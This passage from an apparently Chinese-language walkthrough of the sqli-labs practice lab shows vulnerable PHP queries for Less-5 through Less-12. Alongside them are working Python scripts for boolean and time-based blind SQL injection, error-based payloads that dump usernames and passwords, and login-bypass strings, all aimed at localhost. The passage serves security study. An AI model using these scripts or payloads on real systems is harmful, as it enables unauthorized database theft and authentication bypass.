class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/less-5/?id=1"</span></span><br><span class="line">key = <span class="string">"You"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dblength</span><span class="params">(url)</span>:</span></span><br><span class="line">    dbLen = <span class="number">-1</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    stop = <span class="number">100</span></span><br><span class="line">    <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">        mid = int((start + stop) / <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">"' and length(database())&gt;&#123;0&#125;%23"</span>.format(mid)</span><br><span class="line">        reqUrl = url + payload</span><br><span class="line">        print(reqUrl)</span><br><span class="line">        cont = requests.get(reqUrl)</span><br><span class="line">        conTrue = requests.get(url + <span class="string">"' and length(database())=&#123;0&#125;%23"</span>.format(mid))</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">            dbLen = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> cont.text):</span><br><span class="line">            start = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stop = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dbLen</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SearchdbName</span><span class="params">(url,dbLen)</span>:</span></span><br><span class="line">    DbName = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[+]Test &#123;0&#125; Bytes"</span>.format(i))</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        stop = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">            mid = int((start + stop)/<span class="number">2</span>)</span><br><span class="line">            payload = <span class="string">"' and ascii(mid((database()),&#123;0&#125;,1))&gt;&#123;1&#125;%23"</span>.format(i,str(mid))</span><br><span class="line">            reqUrl = url + payload</span><br><span class="line">            print(reqUrl)</span><br><span class="line">            cont = requests.get(reqUrl)</span><br><span class="line">            conTrue = requests.get(url + <span class="string">"' and ascii(mid((database()),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(i,str(mid)))</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">                DbName += chr(mid)</span><br><span class="line">                print(DbName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(key <span class="keyword">in</span> cont.text):</span><br><span class="line">                <span class="comment">#print("[+] start",start,stop,mid)</span></span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stop = mid</span><br><span class="line">    <span class="keyword">return</span> DbName</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tableLen</span><span class="params">(url)</span>:</span></span><br><span class="line">    dbLen = <span class="number">-1</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    stop = <span class="number">100</span></span><br><span class="line">    <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">        mid = int((start + stop) / <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">"' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;&#123;0&#125;%23"</span>.format(mid)</span><br><span class="line">        reqUrl = url + payload</span><br><span class="line">        print(reqUrl)</span><br><span class="line">        cont = requests.get(reqUrl)</span><br><span class="line">        conTrue = requests.get(url + <span class="string">"' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=&#123;0&#125;%23"</span>.format(mid))</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">            dbLen = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> cont.text):</span><br><span class="line">            start = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stop = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dbLen</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SearchTbName</span><span class="params">(url,dbLen)</span>:</span></span><br><span class="line">    DbName = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[+]Test &#123;0&#125; Bytes"</span>.format(i))</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        stop = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">            mid = int((start + stop)/<span class="number">2</span>)</span><br><span class="line">            payload = <span class="string">"' and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;%23"</span>.format(i,str(mid))</span><br><span class="line">            reqUrl = url + payload</span><br><span class="line">            print(reqUrl)</span><br><span class="line">            cont = requests.get(reqUrl)</span><br><span class="line">            conTrue = requests.get(url + <span class="string">"' and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(i,str(mid)))</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">                DbName += chr(mid)</span><br><span class="line">                print(DbName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(key <span class="keyword">in</span> cont.text):</span><br><span class="line">                <span class="comment">#print("[+] start",start,stop,mid)</span></span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stop = mid</span><br><span class="line">    <span class="keyword">return</span> DbName</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnLen</span><span class="params">(url,tableName)</span>:</span></span><br><span class="line">    dbLen = <span class="number">-1</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    stop = <span class="number">100</span></span><br><span class="line">    <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">        mid = int((start + stop) / <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">"' and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;'))&gt;&#123;1&#125;%23"</span>.format(tableName,mid)</span><br><span class="line">        reqUrl = url + payload</span><br><span class="line">        print(reqUrl)</span><br><span class="line">        cont = requests.get(reqUrl)</span><br><span class="line">        conTrue = requests.get(url + <span class="string">"' and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;'))=&#123;1&#125;%23"</span>.format(tableName,mid))</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">            dbLen = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> cont.text):</span><br><span class="line">            start = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stop = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dbLen</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SearchCnName</span><span class="params">(url,dbLen,tableName)</span>:</span></span><br><span class="line">    DbName = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[+]Test &#123;0&#125; Bytes"</span>.format(i))</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        stop = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">            mid = int((start + stop)/<span class="number">2</span>)</span><br><span class="line">            payload = <span class="string">"' and ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;'),&#123;1&#125;,1))&gt;&#123;2&#125;%23"</span>.format(tableName,i,str(mid))</span><br><span class="line">            reqUrl = url + payload</span><br><span class="line">            print(reqUrl)</span><br><span class="line">            cont = requests.get(reqUrl)</span><br><span class="line">            conTrue = requests.get(url + <span class="string">"' and ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;'),&#123;1&#125;,1))=&#123;2&#125;%23"</span>.format(tableName,i,str(mid)))</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">                DbName += chr(mid)</span><br><span class="line">                print(DbName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(key <span class="keyword">in</span> cont.text):</span><br><span class="line">                <span class="comment">#print("[+] start",start,stop,mid)</span></span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stop = mid</span><br><span class="line">    <span class="keyword">return</span> DbName</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DataLen</span><span class="params">(url,ColumnName,tableName)</span>:</span></span><br><span class="line">    dbLen = <span class="number">-1</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    stop = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">        mid = int((start + stop) / <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">"' and length((select group_concat(&#123;0&#125;) from &#123;1&#125;))&gt;&#123;2&#125;%23"</span>.format(ColumnName,tableName,mid)</span><br><span class="line">        reqUrl = url + payload</span><br><span class="line">        print(reqUrl)</span><br><span class="line">        cont = requests.get(reqUrl)</span><br><span class="line">        conTrue = requests.get(url + <span class="string">"' and length((select group_concat(&#123;0&#125;) from &#123;1&#125;))=&#123;2&#125;%23"</span>.format(ColumnName,tableName,mid))</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">            dbLen = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> cont.text):</span><br><span class="line">            start = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stop = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dbLen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SearchDataName</span><span class="params">(url,dbLen,ColumnName,tableName)</span>:</span></span><br><span class="line">    DbName = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[+]Test &#123;0&#125; Bytes"</span>.format(i))</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        stop = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= stop):</span><br><span class="line">            mid = int((start + stop)/<span class="number">2</span>)</span><br><span class="line">            payload = <span class="string">"' and ascii(mid((select group_concat(&#123;0&#125;) from &#123;1&#125;),&#123;2&#125;,1))&gt;&#123;3&#125;%23"</span>.format(ColumnName,tableName,i,str(mid))</span><br><span class="line">            reqUrl = url + payload</span><br><span class="line">            <span class="comment">#print(reqUrl)</span></span><br><span class="line">            cont = requests.get(reqUrl)</span><br><span class="line">            conTrue = requests.get(url + <span class="string">"' and ascii(mid((select group_concat(&#123;0&#125;) from &#123;1&#125;),&#123;2&#125;,1))=&#123;3&#125;%23"</span>.format(ColumnName,tableName,i,str(mid)))</span><br><span class="line">            print(url + <span class="string">"' and ascii(mid((select group_concat(&#123;0&#125;) from &#123;1&#125;),&#123;2&#125;,1))&gt;&#123;3&#125;%23"</span>.format(ColumnName,tableName,i,str(mid)))</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> conTrue.text):</span><br><span class="line">                DbName += chr(mid)</span><br><span class="line">                print(DbName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(key <span class="keyword">in</span> cont.text):</span><br><span class="line">                <span class="comment">#print("[+] start",start,stop,mid)</span></span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stop = mid</span><br><span class="line">    <span class="keyword">return</span> DbName</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbLen = dblength(url)</span><br><span class="line">print(<span class="string">"[+]DataBase Length"</span>,dbLen)</span><br><span class="line">DbName = SearchdbName(url,dbLen)</span><br><span class="line">print(<span class="string">"[+]DataBase Name"</span>,DbName)</span><br><span class="line">tbLen = tableLen(url)</span><br><span class="line">print(<span class="string">"[+]Table Length"</span>,tbLen)</span><br><span class="line">TbName = SearchTbName(url,tbLen)</span><br><span class="line">print(<span class="string">"[+]Table Name"</span>,TbName)</span><br><span class="line"></span><br><span class="line">tableName=<span class="string">'users'</span></span><br><span class="line">CnLen = columnLen(url,tableName)</span><br><span class="line">print(<span class="string">"[+]Column Length"</span>,CnLen)</span><br><span class="line">CnName = SearchCnName(url,CnLen,tableName)</span><br><span class="line">print(<span class="string">"[+]Column Name"</span>,CnName)</span><br><span class="line"></span><br><span class="line">ColumnName = CnName</span><br><span class="line">DaLen = DataLen(url,ColumnName,tableName)</span><br><span class="line">print(<span class="string">"[+]Data Length"</span>,DaLen)</span><br><span class="line">DaName = SearchDataName(url,DaLen,ColumnName,tableName)</span><br><span class="line">print(<span class="string">"[+]Data Name"</span>,DaName)</span><br></pre></td></tr></table></figure>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>sql语句拼接发生了变化，仍然可以用上一题的注入方法，稍微修改下payload即可</p>
<p>报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-6/?id=-1&quot; or updatexml(0,concat(0x7e,(select group_concat(id,username,password) from users)),1)%23</span><br></pre></td></tr></table></figure>
<p>盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://localhost/sqli-labs/less-6/?id=1&quot; and length(database())&gt;0%23</span><br></pre></td></tr></table></figure>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的sql语句拼接变成了<code>((&#39;id&#39;))</code>，屏蔽了报错函数，只能使用盲注了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://localhost/sqli-labs/less-7/?id=1&apos;)) and length(database())&gt;0%23</span><br></pre></td></tr></table></figure>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
<p>sql语句拼接变成了<code>id=&#39;$id&#39;</code>，同样屏蔽报错函数，使用盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://localhost/sqli-labs/less-8/?id=1&apos; and length(database())&gt;0%23</span><br></pre></td></tr></table></figure>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>Less-9这里正确和错误的页面返回一致，并且屏蔽了报错函数，只能使用延时注入(基于时间的盲注)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/less-9/?id=1'"</span></span><br><span class="line"></span><br><span class="line">dbLen = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    dbLen +=<span class="number">1</span></span><br><span class="line">    reqUrl = url +<span class="string">"  and if(length(database())=&#123;0&#125;,sleep(3),1)%23"</span>.format(dbLen)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    res = requests.get(reqUrl)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(reqUrl,end_time - start_time)</span><br><span class="line">    <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"dbLen"</span>,dbLen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解数据库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        reqUrl = url +<span class="string">" and if(ascii(mid((database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)%23"</span>.format(str(i+<span class="number">1</span>),str(c))</span><br><span class="line">        <span class="comment">#print(reqUrl)</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        requests.get(reqUrl)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(reqUrl, end_time - start_time)</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2</span>:</span><br><span class="line">            flag += chr(c)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'data:'</span>,flag)</span><br></pre></td></tr></table></figure>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
<p>这里也是拼接发生了变化，同样使用基于时间的盲注，修改payload即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-9/?id=1&quot;</span><br></pre></td></tr></table></figure>
<h2 id="Less-11-login-inject"><a href="#Less-11-login-inject" class="headerlink" title="Less-11 login inject"></a>Less-11 login inject</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo '&lt;font color= "#0000ff"&gt;';	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line">		<span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line">		<span class="comment">//echo "Try again looser";</span></span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里是登陆页面，可以使用万能密码来绕过登陆，同时存在报错注入</p>
<p>万能密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%<span class="number">27</span>+%<span class="number">23</span>&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570240504458.png" alt="1570240504458"></p>
<p>报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos; or updatexml(1,concat(0x7e,(select group_concat(id,0x7e,username,0x7e,password) from users)),0) #&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570240840748.png" alt="1570240840748"></p>
<h2 id="Less-12-login-inject"><a href="#Less-12-login-inject" class="headerlink" title="Less-12 login inject"></a>Less-12 login inject</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>这里只是语句拼接发生了变化，稍微修改payload即可</p>
<p>万能密码登陆</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%22%29+%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570241269081.png" alt="1570241269081"></p>
<p>报错注入</p>
